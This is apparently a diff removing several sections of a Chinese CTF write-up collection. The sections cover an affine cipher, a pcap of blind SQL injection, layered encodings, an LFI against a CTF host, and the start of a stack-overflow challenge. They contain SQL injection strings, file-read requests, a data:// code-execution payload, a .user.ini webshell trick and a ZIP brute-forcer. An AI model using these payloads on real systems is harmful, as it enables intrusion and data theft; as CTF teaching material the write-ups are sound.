-## 第16题：仿射密码 — 小学生密码学
-
-### 题目信息
-
-| 项目 | 内容 |
-|------|------|
-| 题目类型 | Crypto - 经典密码 |
-| 难度 | 入门 |
-| 日期 | 2026-08-01 |
-| 关联课程 | 信息安全数学基础（数论） |
-
-### 题目内容
-
-加密函数：`e(x) = 11x + 6 (mod 26)`
-
-密文：`welcylk`
-
-（flag 为 base64 形式）
-
-### 解题思路
-
-**1. 识别密码类型**
-
-`e(x) = ax + b (mod m)` 是标准的**仿射密码（Affine Cipher）**公式，其中：
-- `a = 11`（乘法密钥）
-- `b = 6`（加法密钥/位移）
-- `m = 26`（字母表长度）
-
-仿射密码 = 凯撒密码（加法）+ 乘法密码的复合，是信息安全数学基础课的经典内容。
-
-> **⚠️ 你说的"阿基米德算法"其实是"扩展欧几里得算法"（Extended Euclidean Algorithm）**，正是这题的核心——用来求模逆元进行解密。
-
-**2. 数学原理：仿射密码的加解密**
-
-```
-加密: E(x) = (a * x + b) mod m
-解密: D(y) = a_inv * (y - b) mod m
-```
-
-其中 `a_inv` 是 `a` 模 `m` 的**乘法逆元**，满足 `a * a_inv ≡ 1 (mod m)`。
-
-关键前提：`gcd(a, m) = 1`（a 和 m 必须互素），否则模逆元不存在，密码不可逆。
-
-```
-gcd(11, 26) = 1 → 可解 ✓
-```
-
-**3. 扩展欧几里得算法求模逆元**
-
-扩展欧几里得算法在求 `gcd(a, m)` 的同时，找到整数 `x, y` 满足：
-
-```
-a * x + m * y = gcd(a, m)
-```
-
-当 `gcd = 1` 时，`x` 就是 `a` 的模逆元（取正模后）。
-
-```
-gcd(11, 26):
-  26 = 2 * 11 + 4    →  gcd(11, 4)
-  11 = 2 * 4 + 3     →  gcd(4, 3)
-  4  = 1 * 3 + 1     →  gcd(3, 1)
-  3  = 3 * 1 + 0     →  gcd = 1
-
-回代求 Bezout 系数:
-  1 = 4 - 1*3
-    = 4 - 1*(11 - 2*4) = 3*4 - 11
-    = 3*(26 - 2*11) - 11 = 3*26 - 7*11
-
-所以: -7*11 ≡ 1 (mod 26)
-      11 * (-7) ≡ 1 (mod 26)
-      a_inv = -7 mod 26 = 19
-
-验证: 11 * 19 = 209 = 8*26 + 1 ≡ 1 (mod 26) ✓
-```
-
-> **技巧**：手算模逆元时，也可以暴力枚举——从 1 到 25 逐个试 `(11 * i) % 26 == 1`，很快就能找到 19。但理解扩展欧几里得算法的原理更重要，因为大数场景（如 RSA）暴力不可行。
-
-**4. 逐字符解密**
-
-```
-解密公式: D(y) = 19 * (y - 6) mod 26
-
-w: y=22, D = 19*(22-6) mod 26 = 19*16 mod 26 = 304 mod 26 = 18 → s
-e: y=4,  D = 19*(4-6)  mod 26 = 19*(-2) mod 26 = -38 mod 26 = 14 → o
-l: y=11, D = 19*(11-6) mod 26 = 19*5  mod 26 = 95  mod 26 = 17 → r
-c: y=2,  D = 19*(2-6)  mod 26 = 19*(-4) mod 26 = -76 mod 26 = 2  → c
-y: y=24, D = 19*(24-6) mod 26 = 19*18 mod 26 = 342 mod 26 = 4  → e
-l: y=11, D = 19*(11-6) mod 26 = 19*5  mod 26 = 95  mod 26 = 17 → r
-k: y=10, D = 19*(10-6) mod 26 = 19*4  mod 26 = 76  mod 26 = 24 → y
-
-明文: sorcery (巫术/魔法)
-```
-
-**5. Base64 编码**
-
-```
-sorcery → base64 → c29yY2VyeQ==
-```
-
-Flag: `flag{c29yY2VyeQ==}`
-
-### 解题脚本
-
-```python
-import base64
-
-a, b, m = 11, 6, 26
-CIPHERTEXT = 'welcylk'
-
-def extended_gcd(a, m):
-    """扩展欧几里得算法，返回 (gcd, x, y) 使 a*x + m*y = gcd"""
-    if a == 0:
-        return m, 0, 1
-    g, x1, y1 = extended_gcd(m % a, a)
-    return g, y1 - (m // a) * x1, x1
-
-def mod_inverse(a, m):
-    """求 a 模 m 的乘法逆元"""
-    g, x, _ = extended_gcd(a % m, m)
-    if g != 1:
-        raise ValueError(f'{a} 和 {m} 不互素，无模逆元')
-    return x % m
-
-# 求模逆元
-a_inv = mod_inverse(a, m)
-print(f'a_inv = {a_inv}')  # 19
-
-# 解密: D(y) = a_inv * (y - b) mod m
-plaintext = ''.join(
-    chr((a_inv * (ord(ch) - ord('a') - b)) % m + ord('a'))
-    for ch in CIPHERTEXT
-)
-print(f'明文: {plaintext}')  # sorcery
-
-# Base64 编码
-flag = base64.b64encode(plaintext.encode()).decode()
-print(f'Flag: flag{{{flag}}}')
-```
-
-### 运行结果
-
-```
-仿射密码: E(x) = 11x + 6 (mod 26)
-密文: welcylk
-
-[1] 扩展欧几里得算法:
-    gcd(11, 26) = 1 (必须为1，否则不可解)
-    11 的模逆元 a_inv = 19
-    验证: 11 * 19 mod 26 = 1
-    解密公式: D(y) = 19 * (y - 6) mod 26
-
-[2] 解密:
-    密文: welcylk
-    明文: sorcery
-
-[3] 加密验证:
-    明文: sorcery
-    加密: welcylk
-    匹配: True
-
-[4] Base64 编码:
-    明文: sorcery
-    Base64: c29yY2VyeQ==
-
-Flag: flag{c29yY2VyeQ==}
-```
-
-Flag: `flag{c29yY2VyeQ==}`
-
-### 涉及知识点
-
-| 知识点 | 说明 |
-|--------|------|
-| 仿射密码 | `E(x) = ax + b (mod m)`，凯撒密码的推广，结合乘法密码与加法密码 |
-| 模逆元 | `a * a_inv ≡ 1 (mod m)`，解密的关键，需 `gcd(a, m) = 1` |
-| 扩展欧几里得算法 | 求 gcd 同时求 Bezout 系数，用于计算模逆元 |
-| gcd 互素条件 | `gcd(a, m) = 1` 是仿射密码可逆的充要条件 |
-| Base64 编码 | 将字节序列编码为 ASCII 字符，CTF 常见的 flag 包装格式 |
-| 模运算 | 负数取模需注意：`-38 mod 26 = 14`（不是 -12），Python 的 `%` 自动处理 |
-
-> **技巧**：识别仿射密码——看到 `e(x) = ax + b (mod m)` 形式就是仿射密码。解题三步走：①验证 `gcd(a,m)=1` → ②扩展欧几里得求 `a_inv` → ③代入 `D(y) = a_inv * (y-b) mod m` 逐字符解密。
-
-> **技巧**：Python 的 `%` 运算符对负数也返回非负结果（如 `-38 % 26 = 14`），所以解密公式可以直接写 `(a_inv * (y - b)) % m`，无需手动处理负数。C/C++/Java 则需加 `m` 再取模。
-
-### 同类变体与扩展
-
-- **已知 a, b 直接解**：本题形式，最简单
-- **已知 a, b 未知（已知明文攻击）**：通过一对明文-密文列出方程组求解
-- **唯密文攻击**：利用字母频率分析 + 暴力枚举 `a`（12 个候选值）和 `b`（26 个候选值），共 312 种可能
-- **a 的有效值**：模 26 下与 26 互素的 a 有 φ(26) = 12 个（1,3,5,7,9,11,15,17,19,21,23,25），密钥空间 12×26 = 312
-- **与 RSA 的联系**：RSA 解密也需要模逆元求 `d = e_inv mod φ(n)`，但模数极大，暴力不可行，必须用扩展欧几里得
-- **Hill 密码**：仿射密码的矩阵推广版，`E(x) = Kx + b (mod m)`，K 为矩阵，逆元变为逆矩阵
-
----
-
-## 第17题：流量分析 — SQL 盲注流量还原
-
-### 题目信息
-
-| 项目 | 内容 |
-|------|------|
-| 题目类型 | Web - 流量分析 / Forensics |
-| 难度 | 中等 |
-| 日期 | 2026-08-01 |
-| 附件 | 流量分析.pcap（2.5MB，16836 个包） |
-
-### 题目内容
-
-提供一个 `.pcap` 网络流量抓包文件，要求从中还原出攻击者提取的数据（flag）。
-
-### 解题思路
-
-**1. 流量概览**
-
-```
-总包数: 16836
-协议: 全部 TCP
-通信: 127.0.0.1 → 127.0.0.1 (本地环回)
-端口: 客户端随机端口 → 服务器 80 端口
-```
-
-全是本地 HTTP 流量，客户端用 `python-requests/2.28.1` 发送请求。
-
-**2. 识别攻击模式**
-
-提取 HTTP 请求发现 1403 个注入请求，全部指向 `/comments.php?name=`：
-
-```http
-GET /comments.php?name=if((substr((select(text)from(wfy_comments)where(id=100)),1,1)="q"),100,0) HTTP/1.1
-```
-
-这是一个典型的 **SQL 布尔盲注（Boolean-Based Blind SQL Injection）**：
-
-```
-if(substr(目标字符, 位置, 1) = "候选字符", 100, 0)
-```
-
-- 条件为 **true** → 返回 100 条评论（响应体更大）
-- 条件为 **false** → 返回 0 条评论（响应体更小）
-
-攻击者从 `wfy_comments` 表 `id=100` 记录的 `text` 字段逐字符提取 flag。
-
-> **⚠️ 识别要点**：看到 `substr(..., pos, 1) = "char"` 配合 `if(..., 100, 0)` 模式，就是布尔盲注逐字符爆破。关键在于如何区分 true/false 响应。
-
-**3. 区分 true/false 响应（核心难点）**
-
-HTTP 响应使用 `Content-Encoding: gzip` + `Transfer-Encoding: chunked` 双重编码，不能直接用原始字节长度判断。
-
-解压步骤：
-```
-原始响应 → 找 \r\n\r\n 分隔头部和body → 提取chunk
-→ 解析 hex chunk size → 取 chunk content → gzip解压 → 得到HTML
-```
-
-解压后统计 content 长度：
-- **false 响应**（0 条评论）：content_len = 830（1164 次，大多数）
-- **true 响应**（100 条评论）：content_len = 841 或 842（共 42 次）
-
-分界线：`content_len > 830` 即为 true。
-
-> **技巧**：流量分析题中，gzip + chunked 编码会导致原始字节长度差异很小（705-714字节），直接用原始长度判断容易误判。**必须解压后再比较内容长度**，差异才清晰（830 vs 842）。
-
-**4. 逐字符还原**
-
-对每个位置 `pos`（1~42），取 content_len 最大的字符（即 true 字符），按位置拼接：
-
-```
-pos 1: f (842) ← f 是第1位正确的字符
-pos 2: l (842)
-pos 3: a (842)
-pos 4: g (842)
-pos 5: { (842)
-...
-pos 42: } (842)
-```
-
-### 解题脚本
-
-```python
-from scapy.all import rdpcap
-import re, gzip
-from urllib.parse import unquote
-
-pkts = rdpcap('流量分析.pcap')
-
-# 按源端口配对请求和响应
-streams = {}
-for p in pkts:
-    if p.haslayer('TCP') and p.haslayer('Raw'):
-        tcp = p['TCP']
-        if tcp.dport == 80:    # 请求
-            streams.setdefault(tcp.sport, {})['req'] = tcp['Raw'].load.decode('utf-8', errors='replace')
-        elif tcp.sport == 80:  # 响应
-            streams.setdefault(tcp.dport, {})['resp_raw'] = tcp['Raw'].load
-
-# 解析注入参数 + 解压响应
-results = {}
-for data in streams.values():
-    m = re.search(r'substr\(\(select\(text\)from\(wfy_comments\)where\(id=(\d+)\)\),(\d+),1\)=%22(.+?)%22', data.get('req', ''))
-    if not m:
-        continue
-    rid, pos, char = int(m.group(1)), int(m.group(2)), unquote(m.group(3))
-
-    # 解压 gzip + chunked 响应
-    resp = data.get('resp_raw', b'')
-    header_end = resp.find(b'\r\n\r\n')
-    if header_end < 0:
-        continue
-    body = resp[header_end + 4:]
-    crlf = body.find(b'\r\n')
-    try:
-        chunk_size = int(body[:crlf].decode('ascii'), 16)
-        content = gzip.decompress(body[crlf + 2:crlf + 2 + chunk_size])
-        content_len = len(content)
-    except:
-        content_len = 0
-
-    results.setdefault((rid, pos), []).append((char, content_len))
-
-# 还原 flag: 取每个位置 content_len 最大的字符
-flag_chars = {}
-for (rid, pos), chars in results.items():
-    if rid != 100:
-        continue
-    true_chars = [(c, l) for c, l in chars if l > 830]  # >830 为 true
-    if true_chars:
-        flag_chars[pos] = max(true_chars, key=lambda x: x[1])[0]
-
-min_pos, max_pos = min(flag_chars), max(flag_chars)
-flag = ''.join(flag_chars.get(p, '?') for p in range(min_pos, max_pos + 1))
-print(f'Flag: {flag}')
-```
-
-### 运行结果
-
-```
-总包数: 16836
-注入请求数: 1403
-(id=100, pos) 组合: 42 个位置
-
-content_len 分布:
-  830 (false): 1164 次
-  841/842 (true): 42 次
-
-Flag (1-42): flag{c84bb04a-8663-4ee2-9449-349f1ee83e11}
-```
-
-Flag: `flag{c84bb04a-8663-4ee2-9449-349f1ee83e11}`
-
-### 涉及知识点
-
-| 知识点 | 说明 |
-|--------|------|
-| PCAP 流量分析 | 使用 scapy/tshark 解析网络抓包文件，提取 HTTP 请求和响应 |
-| SQL 布尔盲注 | `if(condition, true_value, false_value)` 根据条件返回不同数据量 |
-| TCP 流重组 | 按源端口配对请求和响应包，还原完整的 HTTP 交互 |
-| gzip + chunked 解码 | HTTP 响应双重编码，需先解析 chunk size 再 gzip 解压才能比较真实内容 |
-| 响应大小区分 true/false | 布尔盲注的 true/false 通过响应体大小区分，注意编码压缩会缩小差异 |
-| scapy 库 | Python 网络包分析库，`rdpcap()` 读取 pcap，`p['TCP']`/`p['Raw']` 访问各层 |
-
-> **技巧**：流量分析题三步走：①全局概览（包数/协议/IP对/端口）→ ②识别攻击模式（SQL注入/XSS/上传/爆破）→ ③提取关键数据（请求参数 + 响应内容）。布尔盲注还原的核心是找到 true/false 的**内容长度分界线**。
-
-> **技巧**：HTTP 响应如果是 gzip + chunked 编码，原始字节长度的差异可能只有几个字节（如 705 vs 712），但解压后内容长度差异会更大（如 830 vs 842）。**先解压再比较**，不要只看原始长度。
-
-### 同类变体与扩展
-
-- **时间盲注流量**：`if(condition, sleep(5), 0)`，通过响应时间区分 true/false，需分析时间戳而非内容大小
-- **UNION 注入流量**：直接在响应体中可见数据，提取更简单，无需逐字符还原
-- **文件上传流量**：查找 `Content-Type: multipart/form-data`，提取上传的文件内容
-- **HTTPS 流量**：如果 pcap 含 TLS 握手且有的私钥，可解密后按 HTTP 分析；否则无法查看加密内容
-- **工具推荐**：Wireshark 图形界面可右键 → Follow → HTTP Stream 逐流查看，适合少量流量的手动分析
-- **大流量优化**：本题 16836 包用 scapy 纯 Python 解析约需 5-10 秒，超大 pcap 可用 tshark 预过滤 `-Y http` 减少数据量
-
----
+## IR 方向（应急响应）
 
 ## 第18题：SimpleFlow — 蚁剑 Webshell 流量分析
 
@@ -3075,734 +4560,6 @@ Flag: `DASCTF{f3f32f434eddbc6e6b5043373af95ae8}`
 - **无文件Webshell**：内存马，流量中无文件路径，需关注异常的Java反射或ClassLoader调用
 - **防御建议**：WAF规则检测 `@eval`、`@base64_decode`、`@ini_set("display_errors"` 等蚁剑特征字符串；监控异常POST请求频率和随机UA
 - **pcapng vs pcap**：pcapng 是新一代格式，支持多接口和时间戳精度更高，scapy 的 `rdpcap()` 两者都支持
-
----
-
-## 第19题：easyencode — 五层嵌套编码
-
-### 题目信息
-
-| 项目 | 内容 |
-|------|------|
-| 题目类型 | Crypto - 多层编码 |
-| 难度 | 入门 |
-| 日期 | 2026-08-01 |
-| 题目文件 | `easyencode.zip`（345字节，ZipCrypto加密） |
-
-### 编码链路总览
-
-```
-easyencode.zip (ZIP密码: 100861)
-  └─ encode.txt (3124字节摩斯电码)
-       └─ [Layer 1] 摩斯电码解码 → 528字符hex字符串
-            └─ [Layer 2] Hex解码 → 264字符 \uXXXX Unicode转义序列
-                 └─ [Layer 3] Unicode转义解码 → 44字符 Base64+URL编码
-                      └─ [Layer 4] URL解码 (%3D→=) → 标准Base64
-                           └─ [Layer 5] Base64解码 → flag
-```
-
-### 解题过程
-
-**1. ZIP暴力破解**
-
-ZIP 文件使用 ZipCrypto 传统加密（非 AES）。文件仅 345 字节，含一个 `encode.txt`（原始大小 3124 字节）。
-
-排除伪加密后，对 6 位纯数字密码进行暴力枚举：
-
-```python
-import zipfile, itertools
-
-with zipfile.ZipFile('easyencode.zip', 'r') as z:
-    for combo in itertools.product('0123456789', repeat=6):
-        pwd = ''.join(combo).encode()
-        try:
-            z.setpassword(pwd)
-            z.read('encode.txt')
-            print(f"Password: {pwd.decode()}")
-            break
-        except:
-            continue
-# 密码: 100861
-```
-
-> **技巧**：CTF 中 ZIP 密码常见为纯数字（手机号、短数字）。6 位数字仅 100 万种组合，Python `itertools.product` 几秒内可枚举完毕。
-
-**2. 第一层：摩斯电码解码**
-
-解压后的 `encode.txt` 内容全部是摩斯电码（`.` 和 `-`，空格分隔）：
-
-```
-..... -.-. --... ..... ...-- ----- ...-- ----- ...-- ..... ...-- ..--- .....
-```
-
-摩斯解码使用标准码表。注意本题摩斯码只使用了数字 `0-9` 和字母 `C`（`-.-.`）：
-
-```python
-MORSE_CODE = {
-    '.....': '5', '-.-.': 'C', '--...': '7', '...--': '3',
-    '-----': '0', '....-': '4', '..---': '2', '-....': '6',
-    # ... 完整码表
-}
-decoded = ''.join(MORSE_CODE[m] for m in morse_text.split(' '))
-# 结果: 5C75303035325C75303034375C75303035365C75303037615C...
-# 长度: 528 字符，全部为 hex 字符 (0-9, A-F 中的 C)
-```
-
-> **技巧**：摩斯电码中只出现数字和少数字母时，解码结果很可能是 hex 编码。`5C` = `\`、`75` = `u` 是 Unicode 转义 `\u` 的典型开头，是识别下一层编码的关键线索。
-
-**3. 第二层：Hex 解码**
-
-528 字符 hex 字符串每 2 位一组，解码为 264 字节 ASCII 文本：
-
-```python
-hex_bytes = bytes.fromhex(decoded_morse)
-unicode_escaped = hex_bytes.decode('ascii')
-# 结果: \u0052\u0047\u0056\u007a\u0064\u0044\u0042\u006e\u004d\u0033\u0074\u0045...
-```
-
-Hex 解码后得到的是 `\uXXXX` 格式的 Unicode 转义序列，每 6 个字符（`\u` + 4位hex）表示一个字符。
-
-**4. 第三层：Unicode 转义解码**
-
-将 `\uXXXX` 转义序列逐个转换为实际字符：
-
-```python
-import re
-result = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), unicode_escaped)
-# 结果: RGVzdDBnM3tEZW9kaW5nXzFzX2U0c3lfNF9VfQ%3D%3D
-```
-
-解码后得到 44 字符的字符串，看起来像 Base64 但末尾是 `%3D%3D` 而非 `==`。
-
-> **技巧**：`\uXXXX` 是 JavaScript/Python/Java 中常见的 Unicode 转义格式。正则 `\\u([0-9a-fA-F]{4})` 可批量匹配并转换。注意 Python 字符串中 `\u` 本身是转义前缀，处理时需用原始字符串 `r'\u'` 或双反斜杠 `\\u`。
-
-**5. 第四层：URL 解码**
-
-`%3D` 是 `=` 的 URL 百分号编码。Base64 的填充字符 `=` 被 URL 编码了：
-
-```python
-import urllib.parse
-b64_str = urllib.parse.unquote('RGVzdDBnM3tEZW9kaW5nXzFzX2U0c3lfNF9VfQ%3D%3D')
-# 结果: RGVzdDBnM3tEZW9kaW5nXzFzX2U0c3lfNF9VfQ==
-```
-
-> **技巧**：URL 百分号编码常用于隐藏 Base64 的 `=` 填充符。`%3D` = `=`、`%2B` = `+`、`%2F` = `/` 是 Base64 字符集中常被 URL 编码的三个字符。看到以 `%3D%3D` 结尾的字符串应立即联想到 URL 编码的 Base64。
-
-**6. 第五层：Base64 解码**
-
-标准 Base64 解码得到最终 flag：
-
-```python
-import base64
-flag = base64.b64decode('RGVzdDBnM3tEZW9kaW5nXzFzX2U0c3lfNF9VfQ==').decode('utf-8')
-# 结果: Dest0g3{Deoding_1s_e4sy_4_U}
-```
-
-### 验证
-
-```
-Layer 1 (Morse):    5C75303035325C7530303437...  (528 chars)
-Layer 2 (Hex):      \u0052\u0047\u0056\u007a...  (264 chars)
-Layer 3 (Unicode):  RGVzdDBnM3tEZW9kaW5nXzFzX2U0c3lfNF9VfQ%3D%3D  (44 chars)
-Layer 4 (URL):      RGVzdDBnM3tEZW9kaW5nXzFzX2U0c3lfNF9VfQ==  (44 chars)
-Layer 5 (Base64):   Dest0g3{Deoding_1s_e4sy_4_U}  ✓
-```
-
-Flag: `Dest0g3{Deoding_1s_e4sy_4_U}`
-
-### 涉及知识点
-
-| 知识点 | 说明 |
-|--------|------|
-| ZIP 暴力破解 | ZipCrypto 传统加密，6 位纯数字密码可通过 `itertools.product` 快速枚举 |
-| 摩斯电码 (Morse Code) | 点划编码，数字 0-9 和字母 A-Z 各有唯一编码；本题仅用数字+字母C |
-| Hex 编码 | 每 2 个 hex 字符表示 1 字节，`5C`=`\`、`75`=`u` 是识别 Unicode 转义的关键 |
-| Unicode 转义 `\uXXXX` | 4 位 hex 表示 Unicode 码点，常见于 JS/Python/Java 字符串 |
-| URL 百分号编码 | `%XX` 格式，`%3D`=`=`、`%2B`=`+`、`%2F`=`/`，常隐藏 Base64 特殊字符 |
-| Base64 编码 | 3 字节→4 字符，`=` 为末尾填充，`+` 和 `/` 为扩展字符 |
-
-> **技巧**：多层编码题的通用解题策略——**从外到内逐层剥离**。每层解码后先观察结果特征（字符集、长度、结构），再判断下一层编码类型。关键识别特征：① 全 hex 字符→Hex解码；② `\uXXXX` 模式→Unicode转义；③ `%XX` 模式→URL解码；④ `[A-Za-z0-9+/=]` 字符集→Base64解码。
-
-> **技巧**：题名是最好的提示。`easyencode` 强调"编码"而非"加密"，意味着无需密钥的编码链，关键是识别每层编码类型。类似题名还有 `encode`、`encoding`、`base` 等。
-
-### 同类变体与扩展
-
-- **编码层数变化**：常见 2-5 层嵌套，可能加入 Base32、Base58、ROT13、AAencode（JS颜文字编码）、Brainfuck 等冷门编码
-- **UUencode/XXencode**：较老的二进制转文本编码，字符集不同于 Base64
-- **摩斯电码变体**：分隔符可能用 `/` 或换行而非空格；可能包含标点符号摩斯码
-- **Hex 变体**：可能用 `0x` 前缀、`\x` 前缀、或空格分隔的 hex
-- **防御/检测**：多层编码是恶意软件混淆 payload 的常见手段，YARA 规则可检测 base64/hex 链式编码特征
-
-### 解题脚本
-
-完整脚本：[Crypto/19-easyencode/solve.py](Crypto/19-easyencode/solve.py)
-
-```python
-# 核心解码链（5层）
-import zipfile, re, base64, urllib.parse
-
-# Layer 0: ZIP解压 (密码: 100861)
-with zipfile.ZipFile('easyencode.zip', 'r') as z:
-    z.setpassword(b'100861')
-    morse_text = z.read('encode.txt').decode('utf-8')
-
-# Layer 1: 摩斯电码 → hex字符串
-MORSE = {'.....': '5', '-.-.': 'C', '--...': '7', '...--': '3', '-----': '0', ...}
-hex_str = ''.join(MORSE[m] for m in morse_text.split(' '))
-
-# Layer 2: Hex解码 → \uXXXX Unicode转义
-unicode_escaped = bytes.fromhex(hex_str).decode('ascii')
-
-# Layer 3: Unicode转义解码 → Base64+URL编码
-b64_url = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), unicode_escaped)
-
-# Layer 4: URL解码 → 标准Base64
-b64_str = urllib.parse.unquote(b64_url)
-
-# Layer 5: Base64解码 → flag
-flag = base64.b64decode(b64_str).decode('utf-8')
-print(flag)  # Dest0g3{Deoding_1s_e4sy_4_U}
-```
-
----
-
-## 第20题：文件上传 — 任意文件读取 (LFI)
-
-### 题目信息
-
-| 项目 | 内容 |
-|------|------|
-| 题目类型 | Web - 文件上传 + 任意文件读取 |
-| 难度 | 入门 |
-| 日期 | 2026-08-02 |
-| 题目URL | `https://dc5195734acf8891d7bf4112.http-ctf2.dasctf.com/` |
-
-### 题目页面
-
-页面有两个功能模块：
-- **图片查看**：通过 `file.php?f=<文件名>` 读取文件内容
-- **图片上传**：通过 `upload.php` 上传文件（POST multipart/form-data）
-
-### 源码审计
-
-通过 `file.php` 读取三个 PHP 文件源码（`file.php`、`upload.php`、`class.php`）：
-
-**file.php**（文件读取接口）：
-
-```php
-$filename = $_GET['f'];
-$show = new Show($filename);
-$show->show();
-```
-
-**class.php** — `Show::show()`（核心漏洞点）：
-
-```php
-class Show {
-    public function show() {
-        if(preg_match('/http|https|file:|php:|gopher|dict|\.\./i', $this->source)) {
-            die('illegal fname :P');
-        } else {
-            echo file_get_contents($this->source);
-            // ... 输出 base64 图片
-        }
-    }
-}
-```
-
-**class.php** — `Upload::file_check()`（上传过滤逻辑）：
-
-```php
-function file_check() {
-    $allowed_types = array("png");
-    $temp = explode(".", $this->f["file"]["name"]);
-    $extension = end($temp);
-    // 扩展名白名单：只允许 png
-    
-    $filter = '/<\?php|php|exec|passthru|popen|proc_open|shell_exec|system|phpinfo|assert|chroot|getcwd|scandir|delete|rmdir|rename|chgrp|chmod|chown|copy|mkdir|file|file_get_contents|fputs|fwrite|dir/i';
-    // 内容黑名单：禁止 <?php、php、exec、system 等关键字
-    if(preg_match_all($filter, $f)) {
-        echo 'what are you doing!! :C';
-        return false;
-    }
-}
-```
-
-### 漏洞分析
-
-**主要漏洞：`file.php` 任意文件读取（LFI）**
-
-`Show::show()` 中 `file_get_contents($this->source)` 的过滤存在缺陷：
-
-| 过滤内容 | 绕过方式 |
-|---------|---------|
-| `http` / `https` | 不使用网络协议 |
-| `file:` / `php:` | 不使用协议封装器 |
-| `gopher` / `dict` | 不使用协议封装器 |
-| `..` (目录穿越) | 使用绝对路径，不需要 `..` |
-| **绝对路径（未过滤）** | **直接读取 `/flag`** |
-
-> **关键**：过滤了协议封装器和 `..` 目录穿越，但**完全没有限制绝对路径**。这意味着可以直接用 `file.php?f=/flag` 读取根目录下的 flag 文件。
-
-**备选攻击面：POP 链反序列化（未使用但值得记录）**
-
-`class.php` 中存在一条完整的 POP 链，可通过文件上传触发：
-
-```
-Test::__destruct()       → echo $this->str  ($str = Upload对象)
-  → Upload::__toString() → echo $this->fname->$this->fsize  ($fname = Show对象)
-    → Show::__get($fsize) → $this->ok($fsize)  (ok方法不存在)
-      → Show::__call('ok', [$fsize]) → backdoor(end($arguments))
-        → include($door)  ← 包含上传的 png 文件执行代码
-```
-
-`Upload::file_check()` 虽然禁止了 `<?php` 等关键字，但可以通过以下方式绕过：
-- `<?= ?>` 短标签（如果短标签开启）
-- `.htaccess` / `.user.ini` 修改解析方式
-- 利用 `include()` 特性：不需要 `<?php` 标签也能执行（但需要 PHP 代码块标识）
-
-### 解题过程
-
-**最短路径：直接读取 /flag**
-
-```
-GET /file.php?f=/flag
-```
-
-利用 `file_get_contents` 无绝对路径限制的缺陷，直接读取系统根目录下的 flag 文件：
-
-```python
-import requests
-
-r = requests.get("https://dc5195734acf8891d7bf4112.http-ctf2.dasctf.com/file.php?f=/flag")
-# 响应: CTF2{1cd01c68-f86c-49aa-b4e0-7ffb38d98ae5}<img src=data:jpg;base64,... />
-flag = r.text.split('<img')[0].strip()
-print(flag)  # CTF2{1cd01c68-f86c-49aa-b4e0-7ffb38d98ae5}
-```
-
-**利用过程：**
-
-```
-[1] 访问首页 → 发现"图片查看"和"图片上传"两个功能
-[2] file.php?f=upload.php → 读取上传处理源码
-[3] file.php?f=class.php  → 读取核心类定义 → 发现 file_get_contents 未过滤绝对路径
-[4] file.php?f=/flag      → 直接读取 flag
-```
-
-Flag: `CTF2{1cd01c68-f86c-49aa-b4e0-7ffb38d98ae5}`
-
-### 涉及知识点
-
-| 知识点 | 说明 |
-|--------|------|
-| 任意文件读取 (LFI) | `file_get_contents()` 接收用户输入但未限制路径，可读取任意文件 |
-| PHP 协议过滤缺陷 | 过滤了 `http/https/file:/php:/gopher/dict` 但遗漏绝对路径 |
-| 文件上传白名单+黑名单 | 扩展名白名单(`png`) + 内容黑名单(`<?php\|exec\|system` 等) |
-| POP 链 (反序列化) | `__destruct→__toString→__get→__call→backdoor→include`，备选攻击路径 |
-| `include()` 执行 | `backdoor()` 中 `include($door)` 可执行 PHP 文件，需绕过内容过滤 |
-
-> **技巧**：文件上传题先审源码再动手。通过 `file.php` 等读取接口获取服务器端 PHP 源码，往往能发现比上传更简单的攻击路径（如本题的 LFI 直接读 flag）。
-
-> **技巧**：`file_get_contents()` 的路径过滤常见缺陷：① 只过滤 `..` 不限绝对路径；② 只过滤 `http://` 不过滤 `/`；③ 遗漏 `php://filter`（本题过滤了 `php:`）；④ 未过滤 `data://` 协议。CTF 中遇到 `file_get_contents` 优先测试绝对路径和协议封装器。
-
-> **技巧**：PHP 类中的魔术方法链（`__destruct→__toString→__get→__call`）是反序列化利用的核心。即使题目没有显式的 `unserialize()`，也可能通过 `phar://` 协议触发反序列化（`file_get_contents` 支持 `phar://`）。
-
-### 同类变体与扩展
-
-- **`php://filter` 绕过**：若过滤了 `php:` 可尝试大小写 `PHP://filter` 或 `PhP://filter`（取决于正则是否区分大小写，本题用了 `i` 修饰符）
-- **`data://` 协议**：`data://text/plain,<?php system('cat /flag');?>` 可直接执行代码（需 `allow_url_include=On`）
-- **`phar://` 反序列化**：上传 phar 文件后通过 `phar://upload/xxx.png` 触发反序列化，利用 POP 链 RCE
-- **`.user.ini` 绕过**：上传 `.user.ini` 文件设置 `auto_prepend_file=shell.png`，使所有 PHP 文件自动包含 webshell
-- **防御建议**：文件读取接口应使用白名单（允许的文件列表），而非黑名单过滤协议；`file_get_contents` 应结合 `realpath()` 检查最终路径是否在允许范围内
-
-### 解题脚本
-
-完整脚本：[Web/20-file-upload-llf/solve.py](Web/20-file-upload-llf/solve.py)
-
-```python
-import requests
-
-BASE = "https://dc5195734acf8891d7bf4112.http-ctf2.dasctf.com"
-
-# 1. 源码审计
-for f in ['file.php', 'upload.php', 'class.php']:
-    r = requests.get(f"{BASE}/file.php?f={f}")
-    print(r.text.split('<img')[0])
-
-# 2. 读取 flag
-r = requests.get(f"{BASE}/file.php?f=/flag")
-flag = r.text.split('<img')[0].strip()
-print(flag)  # CTF2{1cd01c68-f86c-49aa-b4e0-7ffb38d98ae5}
-```
-
----
-
-## 第21题：bypwn — 栈溢出 + Ret2Shellcode（栈地址泄露）
-
-### 题目信息
-
-| 项目 | 内容 |
-|------|------|
-| 题目类型 | PWN - 栈溢出 + Shellcode 注入 |
-| 难度 | 中等 |
-| 日期 | 2026-08-02 |
-| 题目文件 | `bypwn`（6368字节，64位 ELF，stripped） |
-| 远程地址 | `ncat --ssl 1763753f1788882586611eed.tcp-ctf2.dasctf.com 9999` |
-
-### 二进制分析
-
-**安全保护：**
-
-| 保护 | 状态 | 说明 |
-|------|------|------|
-| RELRO | Partial | GOT 可写 |
-| Stack Canary | **无** | 可直接溢出 |
-| NX | **关闭** | GNU_STACK flags=XWR，栈可执行 |
-| PIE | **关闭** | 地址固定 |
-
-**关键函数（反汇编）：**
-
-```
-get_input (0x4007f9):
-  sub rsp, 0x20                    // 32字节缓冲区
-  memset(rbp-0x20, 0, 0x20)
-  puts("well you input:")
-  read(0, rbp-0x20, 0x20)         // [1] 读取32字节，无null终止
-  strdup(rbp-0x20)                 // [2] 复制到堆，无null则读取栈上数据
